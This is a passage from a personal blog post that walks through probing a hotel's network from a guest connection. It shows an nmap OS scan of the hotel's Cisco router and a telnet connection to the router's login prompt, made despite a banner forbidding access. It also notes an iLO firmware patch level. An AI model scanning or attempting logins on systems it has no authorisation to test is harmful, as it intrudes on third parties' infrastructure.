</code></pre></div><p>Hmmm, either this server's not accessible externally any more, or they've done a good job of making it appear dark online.</p> <p>Looking into the security issue, and referencing our google search, it looks like the server's iLO is at 2.55, and the security flaw was patched in 2.54, so the server was likely not susceptible to that hack anyway.</p> <p>Okay, so we followed the yellow brick road a little way and found a potential way in, but one that appears to have been cleaned up. Next up, let's have a look a the next hop on the way out from the hotel to the internet.</p> <h3 id="cisco-router"><a href="#cisco-router" class="header-anchor">#</a> Cisco Router</h3> <p>Let's have a look at the second device on the way out of the hotel to the internet:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; nmap <span class="token operator">-</span>O 203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx

Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2019<span class="token operator">-</span>08<span class="token operator">-</span>25 23:48 New Zealand Standard Time
Nmap scan report <span class="token keyword">for</span> 203<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx
Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0017s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>
Not shown: 997 closed ports
PORT     STATE SERVICE
23<span class="token operator">/</span>tcp   open  telnet
3128<span class="token operator">/</span>tcp open  squid<span class="token operator">-</span>http
8080<span class="token operator">/</span>tcp open  http<span class="token operator">-</span>proxy
Device <span class="token function">type</span>: router<span class="token punctuation">|</span><span class="token keyword">switch</span>
Running: Cisco IOS 12<span class="token punctuation">.</span>X
OS CPE: cpe:<span class="token operator">/</span>h:cisco:870_router cpe:<span class="token operator">/</span>o:cisco:ios:12 cpe:<span class="token operator">/</span>h:cisco:2960_switch
OS details: Cisco 870 router or 2960 <span class="token keyword">switch</span> <span class="token punctuation">(</span>IOS 12<span class="token punctuation">.</span>2 <span class="token operator">-</span> 12<span class="token punctuation">.</span>4<span class="token punctuation">)</span>
Network Distance: 3 hops

OS detection performed<span class="token punctuation">.</span> Please report any incorrect results at https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 5<span class="token punctuation">.</span>83 seconds
</code></pre></div><h4 id="port-23-telnet"><a href="#port-23-telnet" class="header-anchor">#</a> Port 23 - Telnet</h4> <p>Hmmm, that doesn't look very safe - this is a Cisco 870 router running CIOS 12.4 or lower and with port 23, for telnet, open to the public. Let's see if we can connect:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\&gt; telnet 206<span class="token punctuation">.</span>167<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx

CC
CC
XXXXXXXX Auckland
<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
Access strictly prohibited<span class="token punctuation">,</span> authorised personnel only
please contact the hotel IT Solutions Manager on
09 353xxxx before proceeding<span class="token punctuation">.</span> Or email
hxxxx<span class="token operator">-</span>it01@xxxxxxxxauckland<span class="token punctuation">.</span>co<span class="token punctuation">.</span>nz
Thank you<span class="token punctuation">.</span>

User Access Verification

Username:

<span class="token operator">%</span> Username:  timeout expired<span class="token operator">!</span>

Connection to host lost<span class="token punctuation">.</span>
</code></pre></div><p>Okay, so this seems like a bad idea. The hotel really shouldn't allow any kind of plain text connections to its router, and also shouldn't have this port open to their guests.</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> <footer data-v-5677641e><hr data-v-5677641e> <p data-v-5677641e><a href="http://fb.me/mark.honeychurch" target="_blank" rel="noopener noreferrer" data-v-5677641e><i class="fab fa-facebook-f" data-v-5677641e></i>
			Facebook
		</a>
		|
		<a href="https://twitter.com/markhoney" target="_blank" rel="noopener noreferrer" data-v-5677641e><i class="fab fa-twitter" data-v-5677641e></i>
			Twitter
		</a>
		|
		<a href="https://www.linkedin.com/in/markhoneychurch" target="_blank" rel="noopener noreferrer" data-v-5677641e><i class="fab fa-linkedin-in" data-v-5677641e></i>
			LinkedIn
		</a>
		|
		<a href="https://github.com/markhoney" target="_blank" rel="noopener noreferrer" data-v-5677641e><i class="fab fa-github" data-v-5677641e></i>
			Github
		</a>
		|
		<a href="/contact/" data-v-5677641e><i class="fa fa-envelope" data-v-5677641e></i>
			Contact
		</a></p> <p data-v-5677641e><a href="https://mark.honeychurch.org/rss.xml" target="_blank" rel="noopener noreferrer" data-v-5677641e><i class="fas fa-rss" data-v-5677641e></i>
			RSS
		</a>
		|
		<a href="https://mark.honeychurch.org/feed.atom" target="_blank" rel="noopener noreferrer" data-v-5677641e><i class="fas fa-atom" data-v-5677641e></i>
			Atom
		</a>
		|
		<a href="https://mark.honeychurch.org/feed.json" target="_blank" rel="noopener noreferrer" data-v-5677641e><i class="fab fa-js" data-v-5677641e></i>
			JSON
		</a></p> <p data-v-5677641e>Copyright © 2020 Mark Honeychurch</p></footer></main></div><div class="global-ui"><div class="reading-progress top" data-v-56679cca><div class="progress" data-v-56679cca></div></div></div></div>
    <script src="/assets/js/styles.js" defer></script><script src="/assets/js/18.js" defer></script><script src="/assets/js/1.js" defer></script><script src="/assets/js/14.js" defer></script><script src="/assets/js/app.js" defer></script>
  </body>
</html>
